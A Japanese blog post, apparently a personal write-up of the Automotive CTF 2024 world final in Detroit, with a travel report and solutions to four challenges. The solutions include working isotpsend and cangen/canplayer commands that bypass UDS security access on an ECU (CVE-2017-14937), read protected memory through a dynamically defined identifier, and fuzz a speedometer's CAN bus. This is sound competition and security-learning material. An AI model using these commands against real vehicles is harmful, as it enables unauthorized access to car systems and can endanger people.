@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Automotive CTF 2024 世界決勝 - 体験記 &amp; Writeup | 俺とお前とlaysakura</title>
+  
+  <link rel="canonical" href="https://laysakura.github.io/2024/10/24/automotive-ctf-2024-world-final/"/>
+  <meta name="viewport" content="width=device-width">
+  <meta name="description" content="デトロイトで開催されたAutomotive CTFの決勝に “TeamOne” チームとして参加し、出場6チーム中 4位 でした。（※所属とは無関係に個人活動として参加） CTFを初めて1年ちょっと、まさか世界で戦う機会に預かれるなんて思ってもみませんでした。良い経験になりました。 前回の日本決勝の記事 と同様に、体験記と自分が解いた問題のwriteupを書きます。実機がないと再現できない問題">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Automotive CTF 2024 世界決勝 - 体験記 &amp; Writeup">
+<meta property="og:url" content="https://laysakura.github.io/2024/10/24/automotive-ctf-2024-world-final/index.html">
+<meta property="og:site_name" content="俺とお前とlaysakura">
+<meta property="og:description" content="デトロイトで開催されたAutomotive CTFの決勝に “TeamOne” チームとして参加し、出場6チーム中 4位 でした。（※所属とは無関係に個人活動として参加） CTFを初めて1年ちょっと、まさか世界で戦う機会に預かれるなんて思ってもみませんでした。良い経験になりました。 前回の日本決勝の記事 と同様に、体験記と自分が解いた問題のwriteupを書きます。実機がないと再現できない問題">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/10-25/head.png">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/10-25/ford.png">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/10-25/bell.png">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/10-25/ic.png">
+<meta property="article:published_time" content="2024-10-24T00:25:00.000Z">
+<meta property="article:modified_time" content="2024-10-24T00:26:38.906Z">
+<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://laysakura.github.io/img/2024/10-25/head.png">
+
+  <!-- favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+  <link rel="icon" href="/favicon/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-22289437-2']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+  <!-- MathJax -->
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div class="mobile-nav-panel">
+	<i class="icon-reorder icon-large"></i>
+</div>
+<header id="header">
+	<h1 class="blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<nav class="nav">
+		<ul>
+			<li><a href="/archives">過去の投稿</a></li>
+			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
+			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
+		</ul>
+	</nav>
+	<div id="search-form-wrap">
+		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
+	</div>
+</header>
+    <div id="main">
+      <article id="post-Automotive-CTF-2024-世界決勝-writeup" class="post">
+  <footer class="entry-meta-header">
+    <span class="meta-elements date">
+      <a href="/2024/10/24/automotive-ctf-2024-world-final/" class="article-date">
+  <time datetime="2024-10-24T00:25:00.000Z" itemprop="datePublished">2024-10-24</time>
+</a>
+    </span>
+  </footer>
+  
+  <header class="entry-header">
+    
+  
+    <h1 class="article-title entry-title" itemprop="name">
+      Automotive CTF 2024 世界決勝 - 体験記 &amp; Writeup
+    </h1>
+  
+
+  </header>
+  <div class="entry-content">
+    
+    <img src="/img/2024/10-25/head.png" alt="header" width="auto" height="auto">
+
+<p>デトロイトで開催された<a target="_blank" rel="noopener" href="https://vicone.com/automotive-ctf">Automotive CTF</a>の決勝に “TeamOne” チームとして参加し、出場6チーム中 <strong>4位</strong> でした。<br>（※所属とは無関係に個人活動として参加）</p>
+<p>CTFを初めて1年ちょっと、まさか世界で戦う機会に預かれるなんて思ってもみませんでした。良い経験になりました。</p>
+<p><a href="https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/">前回の日本決勝の記事</a> と同様に、体験記と自分が解いた問題のwriteupを書きます。実機がないと再現できない問題ばかりなので（出場した方以外は）「ほーん」くらいにお読みください。</p>
+<span id="more"></span>
+
+<h2><span id="目次">目次</span></h2><!-- toc -->
+
+<ul>
+<li><a href="#%E4%BD%93%E9%A8%93%E8%A8%98">体験記</a></li>
+<li><a href="#writeup">Writeup</a><ul>
+<li><a href="#ramn%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA">RAMNカテゴリ</a><ul>
+<li><a href="#c-cve-2017-14937">[C] CVE-2017-14937</a></li>
+<li><a href="#c-did-not-done">[C] DID not done</a></li>
+</ul>
+</li>
+<li><a href="#i-am-speed-%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA">I am Speed カテゴリ</a><ul>
+<li><a href="#can-utils">can-utils</a></li>
+<li><a href="#peter-parker">Peter Parker</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="体験記">体験記</span></h2><p>10&#x2F;26(木)から日本のコンピューターセキュリティシンポジウムに参加するため、他のコンテスト参加者よりも前入り・早帰りでデトロイトに行きました。</p>
+<p>ヘンリー・フォード博物館に行ったり、</p>
+<img src="/img/2024/10-25/ford.png" alt="ford" width="auto" height="auto">
+
+<p>カナダとの国境にもなっている川に浮かぶベル島という景色最高の島に行ったり、</p>
+<img src="/img/2024/10-25/bell.png" alt="bell" width="auto" height="auto">
+
+<p>地元のビール醸造所に行ったりしてました。デトロイトはあんまり観光地という感じではないですが、早朝のベル島は人も少なくめちゃ気に入りました。</p>
+<p>10&#x2F;21(月)の10:00-17:00がコンテスト。日本決勝と同様、<a target="_blank" rel="noopener" href="https://ramn.readthedocs.io/en/latest/index.html">RAMN</a> を使った問題が大半でしたが、他に自動車のスピードメーター（裏側写真だけ…）を使った問題、NFCカードの問題などありました。</p>
+<img src="/img/2024/10-25/ic.png" alt="ic" width="auto" height="auto">
+
+<p>問題のボリュームも難易度も国内決勝と比べて体感3倍くらい上がっており、多くの問題が解き切れず… それでもチームで分担したり協力したりで良い戦いができたと思います。</p>
+<p>大会後の懇親会では、前年度覇者のpwnalone氏（高レベルなwriteupを拝見して会いたいと思ってた）やRAMN問題の作問者（トヨタの同僚 but 話したの2,3年ぶり）とお話できたりして来てよかった感がありました。</p>
+<p>コンテスト中から一貫して順位や他チームのスコアは非公開で、10&#x2F;25(水)の表彰式で初めて発表されます。日本時間の木曜早朝にチームメンバーからのdiscordメッセージで4位と教えてもらいました。即席チームとしては頑張れたと思うけど微妙に悔しい！</p>
+<p>会場は <a target="_blank" rel="noopener" href="https://www.newlab.com/">Newlab</a> という自動車やらハードウェアに関連するスタートアップが利用するイケてる建物（自動車も搬入できる！）で、気持ちよくコンテストに取り組めました。運営の方々、ありがとうございました！！！！</p>
+<h2><span id="writeup">Writeup</span></h2><p>解いた問題の雑writeupです。問題の原文をメモってなく、機械翻訳のものになります…</p>
+<h3><span id="ramnカテゴリ">RAMNカテゴリ</span></h3><p>ECU CのUDS問題を2問解いた。</p>
+<p>ECU Cが対応していたUDSサービスは以下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">% caringcaribou uds services 0x7e2 0x7ea</span><br><span class="line"></span><br><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x27: SECURITY_ACCESS</span><br><span class="line">Supported service 0x2c: DYNAMICALLY_DEFINE_DATA_IDENTIFIER</span><br><span class="line">Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x3e: TESTER_PRESENT</span><br></pre></td></tr></table></figure>
+
+<p>DYNAMICALLY_DEFINE_DATA_IDENTIFIER (0x2c) は初見。</p>
+<h4><span id="c-cve-2017-14937">[C] CVE-2017-14937</span></h4><blockquote>
+<p>0x1111に何かを書き込み、0x0000に何かを読みに行く。</p>
+</blockquote>
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+💡方針
+
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts">CVE解説論文</a>に従ってSecurity Access突破（シードのNOT演算でキーが出るらしい）</li>
+<li><code>% echo &quot;2E 11 11 AB CD&quot; | isotpsend -s 7e2 -d 7ea can0</code> (DID 0x1111 に適当な値を書く)</li>
+<li><code>% echo &quot;22 00 00&quot; | isotpsend -s 7e2 -d 7ea can0</code> (DID 0x0000 から読む)</li>
+</ol>
+</aside>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Diagnostics Session 0x04 に入る</span></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;10 04&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"></span><br><span class="line"><span class="comment"># セキュリティアクセス (レベル5F)</span></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;27 5f&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"><span class="comment"># =&gt; isotpdumpを眺めてると 5A 33 のシードが返却された</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 論文に従ってNOT演算</span></span><br><span class="line">% python -c <span class="string">&#x27;hex(0x5A33 - 0xFFFF)&#x27;</span></span><br><span class="line"><span class="comment"># =&gt; &#x27;-0xa5cc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A5 CC をキーとしてセキュリティアクセス突破</span></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;27 60 A5 CC&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"></span><br><span class="line"><span class="comment"># DID 0x1111 に適当な値 (AB CD) を書く</span></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;2E 11 11 AB CD&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"></span><br><span class="line"><span class="comment"># DID 0x0000 から読む</span></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;22 00 00&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"><span class="comment"># =&gt; isotprecv -s 7e2 -d 7ea  can0</span></span><br><span class="line"><span class="comment"># ==&gt; 62 00 00 62 68 7B 53 55 50 33 52 53 30 4E 49 63 7D</span></span><br><span class="line"><span class="comment"># ==&gt; ASCIIデコードすると bh&#123;SUP3RS0NIc&#125;</span></span><br></pre></td></tr></table></figure>
+
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+⛳ bh{SUP3RS0NIc}
+</aside>
+
+<h4><span id="c-did-not-done">[C] DID not done</span></h4><blockquote>
+<p>フラグは0x0803e000にある26バイトの文字列だが、Read Memory By Addressがそれを読み込ませてくれない :(</p>
+</blockquote>
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+💡方針
+
+<ol>
+<li>DYNAMICALLY_DEFINE_DATA_IDENTIFIER (0x2c) を使って、どこか適切なDIDを定義し、その値に、アドレスの 0x0803e000 と長さの 26 を指定する</li>
+<li>READ_DATA_BY_IDENTIFIER (0x22) でそのDIDを読むとフラグ</li>
+</ol>
+</aside>
+
+<p>DYNAMICALLY_DEFINE_DATA_IDENTIFIER とかいうサービス、とにかくネットに情報がなく、sub func以下のパラメーターの指定方法が不明。</p>
+<p>とりあえずsub funcを総当りしてみる。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% caringcaribou uds subservices 0x00 0x2c 0x7e2 0x7ea</span><br><span class="line"></span><br><span class="line">0x02 : Unknown NRC value</span><br></pre></td></tr></table></figure>
+
+<p>ネットを探すと、0x02は “Define by Address” ということでアドレスをDIDに紐づく値にセットできるっぽい？</p>
+<p><code>isotpdump -s 7e2 -d 7ea -c -a -u can0</code> しながらガチャガチャ試すと、 <code>incorrectMessageLengthOrInvalidFormat</code> エラーが返るケースと <code>requestOutOfRange</code> エラーが返るケースがある。後者のほうはアドレス値とかDIDが間違ってると推測でき、望みがあると判断した。</p>
+<p>更にガチャガチャし、以下の命令フォーマットであることを突き止める。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2c 02 XX XX YZ 08 03 e0 00 1A&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>XX XX</code>: DID</li>
+<li><code>Y</code>: 「長さ」を表現するためのバイト長。本文では <strong>26</strong> を表現したいので、 <code>Y=1</code> で良い</li>
+<li><code>Z</code>: 「開始アドレス」を表現するためのバイト長。本文では <code>Z=4</code> で良い</li>
+<li><code>08 03 e0 00</code> 問題文で指定された開始アドレス</li>
+<li><code>1A</code>: 問題文で指定された26バイト</li>
+</ul>
+<p>ということで</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2c 02 XX XX 14 08 03 e0 00 1A&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br></pre></td></tr></table></figure>
+
+<p>までは決まるが、 <code>XX XX</code> を適当に決めても <code>requestOutOfRange</code> エラーのまま。</p>
+<p>なんか使えるDIDはないかと、<a target="_blank" rel="noopener" href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DIDのマッピング表が載っているページ</a> を眺める。</p>
+<blockquote>
+<p>0xF300 – 0xF3FF : Dynamically Defined Data Identifier</p>
+</blockquote>
+<p>あった！！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2c 02 F3 00 14 08 03 e0 00 1A&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;22 F3 00&quot;</span> | isotpsend -s 7e2 -d 7ea can0</span><br></pre></td></tr></table></figure>
+
+<p>これで <code>isotprecv -s 7e2 -d 7ea can0</code> でASCIIエンコードされたフラグを得る。</p>
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+⛳ bh{TAKE_THE_LONG_WAY_HOME}
+</aside>
+
+<h3><span id="i-am-speed-カテゴリ">I am Speed カテゴリ</span></h3><p>スピードメーターが会場にデデンと置かれている。既に電源とCAN-to-USBデバイスが配線されており、PCにUSB指して以下のコマンド打つだけでCAN通信ができるようになる。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> can0 <span class="built_in">type</span> can bitrate 500000</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> up can0</span><br><span class="line">candump -t a -ac can0</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>実は決勝対策でスピードメーターを購入して一通りのCANおしゃべりを試していた。役立った。</p>
+<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/ECU-hack-127e7f3e990d8022836fd15524b24794">ECU hack - スピードメーター編 (Notion記事)</a></p>
+<hr>
+<p>問題文はメモしてないので、うろ覚えの題意を書く。</p>
+<h4><span id="can-utils">can-utils</span></h4><blockquote>
+<p>題意: 速度計を荒ぶらせるコマンドを <code>bh&#123;ls -al&#125;</code> のような形式で提出せよ</p>
+</blockquote>
+<p>cangenでファジングする問題。<br>ほぼ <a target="_blank" rel="noopener" href="https://laysakura.notion.site/ECU-hack-127e7f3e990d8022836fd15524b24794#127e7f3e990d80f19a10dfae079758b9">https://laysakura.notion.site/ECU-hack-127e7f3e990d8022836fd15524b24794#127e7f3e990d80f19a10dfae079758b9</a> でやった通り。</p>
+<p>まずリプレイするデータを作成。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> add dev vcan0 <span class="built_in">type</span> vcan</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> up vcan0</span><br><span class="line"></span><br><span class="line">candump vcan0 -l</span><br><span class="line">cangen vcan0 -g 4 -I i -L 8 -D FFFFFFFFFFFFFFFF -n 2048 -v -v</span><br><span class="line"></span><br><span class="line">grep <span class="string">&quot;FFFFFFFFFFFF&quot;</span> candump-2024-10-21_1432606.log &gt; candump-FF.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
+<p><code>canplayer</code> でファジング開始。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;vcan0 0&quot;</span> candump-FF.<span class="built_in">log</span> | canplayer can0=vcan0</span><br></pre></td></tr></table></figure>
+
+<p>速度計やその他のランプ・ビープ音が荒ぶる。</p>
+<p>どのCAN IDが速度計に対応するか探す。1桁目が <code>2</code> であることはすぐ分かったので、そこから二分探索。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% grep <span class="string">&quot;vcan0 2&quot;</span> candump-FF.<span class="built_in">log</span> | canplayer can0=vcan0</span><br><span class="line">% grep <span class="string">&quot;vcan0 2&quot;</span> candump-FF.<span class="built_in">log</span> |<span class="built_in">head</span> -n 128 | canplayer can0=vcan0</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">% grep <span class="string">&quot;vcan0 2&quot;</span> candump-FF.<span class="built_in">log</span> |<span class="built_in">head</span> -n 128 |<span class="built_in">head</span> -n 64 | <span class="built_in">head</span> -n 32  | <span class="built_in">head</span> -n 16 | <span class="built_in">head</span> -n 8 | <span class="built_in">head</span> -n 4| <span class="built_in">tail</span> -n 2 | <span class="built_in">head</span> -n 1 | canplayer can0=vcan0</span><br></pre></td></tr></table></figure>
+
+<p>CAN ID 0x202 が速度計に対応するらしい。</p>
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+⛳ bh{cangen can0 -I 202}
+</aside>
+
+<h4><span id="peter-parker">Peter Parker</span></h4><blockquote>
+<p>題意: パーキング状態かを示すCAN IDを <code>bh&#123;0x123&#125;</code> 形式で答えよ</p>
+</blockquote>
+<p>candumpを眺めていると、CAN ID 0x40AでVINらしきものが流れている。VINは <code>MM7DJ2HAAKW382130</code> だった。<br>どこかのサイト（忘れた）でVIN検索すると、マツダ車らしい。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/commaai/opendbc/blob/master/opendbc/dbc/mazda_2017.dbc">https://github.com/commaai/opendbc/blob/master/opendbc/dbc/mazda_2017.dbc</a> のDBCファイルを眺める。<br>GEARの <code>552</code> (10進数) が正解っぽい。16進数だと <code>0x228</code> 。</p>
+<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
+⛳ bh{0x228}
+</aside>
+
+    
+  </div>
+  <footer class="entry-footer">
+    <div class="entry-meta-footer">
+      <span class="category">
+        
+      </span>
+      <span class="tags">
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      </span>
+    </div>
+  </footer>
+  
+  <footer class="author-info clearfix">
+    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
+    <div class="author-content right">
+      <div class="author-caption">
+        <span class="label">author</span>
+        Sho Nakatani a.k.a. laysakura
+      </div>
+      <p class="author-description">
+        トヨタ自動車株式会社所属。プリンシパル・リサーチャーとして、セキュリティ・プライバシー・データ基盤に関する業務に従事。<br>
+        OSCP/BSCP/CISSP/情報処理安全確保支援士(合格) 等の資格保有。CTF出場やセキュリティ関連の講演活動も行っている。<br>
+        （<a target="_blank" rel="noopener" href="https://github.com/laysakura/resume-jp">詳細プロフィール</a>）
+      </p>
+      <ul class="author-social-buttons">
+        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
+        </li>
+        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+  
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2024/09/14/automotive-ctf-2024-japan-final/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+          Automotive CTF 2024 日本決勝 - 体験記 &amp; Writeup
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
+
+    <!-- comment service provided by disqus -->
+    <script>
+      /**
+       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+       */
+      var disqus_config = function () {
+        this.page.url = https://laysakura.github.io/2024/10/24/automotive-ctf-2024-world-final/;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = https://laysakura.github.io/2024/10/24/automotive-ctf-2024-world-final/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+      };
+      (function () {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+
+        s.src = '//laysakura.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
+  </div>
+</section>
+
+
+    </div>
+    <div class="mb-search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:laysakura.github.io">
+  </form>
+</div>
+<footer id="footer">
+	<h1 class="footer-blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<span class="copyright">
+		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
+		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
+		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+	</span>
+</footer>
+
+    
+<script>
+  var disqus_shortname = 'laysakura';
+  
+  var disqus_url = 'https://laysakura.github.io/2024/10/24/automotive-ctf-2024-world-final/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+
+  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
+  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+  <script>addBackToTop({
+    diameter: 50,
+    backgroundColor: '#33a6b880',
+    textColor: '#fff'
+  })</script>
+
+</body>
+</html>
